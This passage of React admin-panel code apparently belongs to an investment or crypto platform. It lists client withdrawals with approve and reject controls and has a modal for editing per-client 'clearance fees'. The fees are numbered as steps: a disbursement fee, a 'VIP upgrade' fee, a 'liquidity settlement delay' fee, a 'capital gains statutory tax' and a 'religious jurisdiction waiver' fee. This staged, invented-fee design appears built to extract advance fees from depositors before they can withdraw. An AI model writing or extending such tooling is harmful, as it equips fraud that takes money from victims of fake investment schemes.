                            <div className="font-mono font-black text-sm text-white">
                              ${wd.amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                            </div>
                            <div className="text-[10px] text-slate-400 font-mono">
                              Fee: ${wd.fee.toFixed(2)} | Net: ${(wd.amount - wd.fee).toFixed(2)}
                            </div>
                          </td>

                          <td className="py-3 px-4">
                            <span
                              className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-bold ${
                                wd.status === 'COMPLETED'
                                  ? 'bg-emerald-500/20 text-emerald-300'
                                  : wd.status === 'PROCESSING'
                                  ? 'bg-blue-500/20 text-blue-300'
                                  : wd.status === 'REJECTED'
                                  ? 'bg-rose-500/20 text-rose-300'
                                  : 'bg-amber-500/20 text-amber-300'
                              }`}
                            >
                              {wd.status === 'COMPLETED' && <CheckCircle2 className="w-3 h-3" />}
                              {wd.status === 'PROCESSING' && <Clock className="w-3 h-3 animate-spin" />}
                              {wd.status === 'PENDING' && <Clock className="w-3 h-3" />}
                              <span>{wd.status}</span>
                            </span>
                          </td>

                          <td className="py-3 px-4 text-right">
                            {wd.status === 'PENDING' || wd.status === 'PROCESSING' ? (
                              <div className="flex items-center justify-end gap-1.5">
                                <button
                                  onClick={() => handleOpenActionModal(wd, 'COMPLETE')}
                                  className="px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[11px] shadow-sm flex items-center gap-1"
                                >
                                  <CheckCircle2 className="w-3 h-3" />
                                  <span>Approve</span>
                                </button>
                                <button
                                  onClick={() => handleOpenActionModal(wd, 'REJECT')}
                                  className="px-2 py-1 rounded-lg bg-rose-600/20 hover:bg-rose-600/40 text-rose-300 border border-rose-500/30 text-[11px] font-bold"
                                >
                                  Reject
                                </button>
                              </div>
                            ) : (
                              <span className="text-[11px] text-slate-500 font-mono">Archived</span>
                            )}
                          </td>
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* Status Modal */}
      {selectedWd && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl animate-in zoom-in-95 duration-150">
            <h3 className="text-base font-bold text-white mb-1">
              {actionType === 'COMPLETE' ? 'Approve & Settle Withdrawal' : 'Decline Withdrawal Request'}
            </h3>
            <p className="text-xs text-slate-400 mb-4">
              Client: <strong className="text-white">{selectedWd.userName}</strong> | Amount: <strong className="text-emerald-400">${selectedWd.amount.toLocaleString()} ({selectedWd.method?.toUpperCase() || 'CRYPTO'})</strong>
            </p>

            {successMsg && (
              <div className="mb-4 p-3 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-xs">
                {successMsg}
              </div>
            )}

            <form onSubmit={handleExecuteStatusChange} className="space-y-4">
              {actionType === 'COMPLETE' ? (
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">
                    {selectedWd.method === 'bank'
                      ? 'Bank Wire Transfer Reference / Fedwire Number'
                      : selectedWd.method === 'paypal'
                      ? 'PayPal Transaction ID / Confirmation Reference'
                      : 'Blockchain Transaction Hash (TXID)'}
                  </label>
                  <input
                    type="text"
                    required
                    value={txHash}
                    onChange={(e) => setTxHash(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs font-mono text-white focus:outline-none focus:border-emerald-500"
                  />
                  <span className="text-[10px] text-slate-500 mt-1 block">
                    This reference is sent to the client as payout confirmation proof.
                  </span>
                </div>
              ) : (
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">
                    Reason for Declining / Rejection
                  </label>
                  <input
                    type="text"
                    required
                    value={rejectReason}
                    onChange={(e) => setRejectReason(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs text-white focus:outline-none focus:border-rose-500"
                  />
                  <span className="text-[10px] text-slate-500 mt-1 block">
                    Funds will be immediately restored to the client's available balance.
                  </span>
                </div>
              )}

              <div className="flex gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setSelectedWd(null)}
                  className="w-1/3 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className={`flex-1 py-2.5 rounded-xl font-bold text-xs uppercase tracking-wider text-white shadow-lg ${
                    actionType === 'COMPLETE'
                      ? 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-500/20'
                      : 'bg-rose-600 hover:bg-rose-500 shadow-rose-500/20'
                  }`}
                >
                  Confirm {actionType === 'COMPLETE' ? 'Approval' : 'Rejection'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Edit Client Clearance Fees Modal */}
      {editingFeesUser && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="relative w-full max-w-md bg-[#0b1325] border border-[#1d2d4a] rounded-3xl p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <Sliders className="w-5 h-5 text-blue-400" />
                <div>
                  <h3 className="text-sm font-bold text-white">Edit Clearance Fees</h3>
                  <p className="text-[11px] text-slate-400">Client: {editingFeesUser.name}</p>
                </div>
              </div>
              <button
                onClick={() => setEditingFeesUser(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-white bg-slate-900 border border-slate-800 cursor-pointer"
              >
                <XCircle className="w-4 h-4" />
              </button>
            </div>

            <form onSubmit={handleSaveFees} className="space-y-3 text-xs">
              <div>
                <label className="text-slate-300 font-semibold block mb-1">
                  Step 2: Withdrawal Disbursement Fee ($ USD)
                </label>
                <input
                  type="number"
                  min="0"
                  step="any"
                  required
                  value={feeFormWithdrawal}
                  onChange={(e) => setFeeFormWithdrawal(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 font-mono text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              <div>
                <label className="text-slate-300 font-semibold block mb-1">
                  Step 3: Institutional VIP Upgrade Fee ($ USD)
                </label>
                <input
                  type="number"
                  min="0"
                  step="any"
                  required
                  value={feeFormUpgrade}
                  onChange={(e) => setFeeFormUpgrade(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 font-mono text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              <div>
                <label className="text-slate-300 font-semibold block mb-1">
                  Step 4: Liquidity Settlement Delay Fee ($ USD)
                </label>
                <input
                  type="number"
                  min="0"
                  step="any"
                  required
                  value={feeFormDelay}
                  onChange={(e) => setFeeFormDelay(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 font-mono text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              <div>
                <label className="text-slate-300 font-semibold block mb-1">
                  Step 5: Capital Gains Statutory Tax Fee ($ USD)
                </label>
                <input
                  type="number"
                  min="0"
                  step="any"
                  required
                  value={feeFormTax}
                  onChange={(e) => setFeeFormTax(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 font-mono text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              <div>
                <label className="text-slate-300 font-semibold block mb-1">
                  Step 6: Religious Jurisdiction Waiver Fee ($ USD)
                </label>
                <input
                  type="number"
                  min="0"
                  step="any"
                  required
                  value={feeFormJurisdiction}
                  onChange={(e) => setFeeFormJurisdiction(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 font-mono text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              <div className="flex gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setEditingFeesUser(null)}
                  className="w-1/3 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="flex-1 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold shadow-lg shadow-blue-500/20 cursor-pointer"
                >
                  Save Custom Fees
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

